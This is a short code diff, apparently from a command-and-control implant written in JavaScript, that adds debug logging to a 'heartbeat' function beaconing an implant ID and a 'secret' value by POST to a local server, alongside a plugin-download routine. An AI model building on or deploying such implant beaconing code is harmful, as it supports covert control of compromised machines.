@@ -71,15 +71,18 @@ var download_plugins = function() {
 };
 
 var heartbeat = function() {
-    const postData = JSON.stringify({
-        IN: implant[IN],
-        CP: 'secret'
-    });
+    console.log("IMPLANT: ",implant);
+    const data = {};
+    data[IN] = implant[IN];
+    data[CP] = 'secret';
+
+    const postData = JSON.stringify(data);
+    console.log("SENDING", data,postData);   
 
     const options = {
         hostname: 'localhost',
         port: 8000,
-        path: '/whoami.js',
+        path: '/',
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
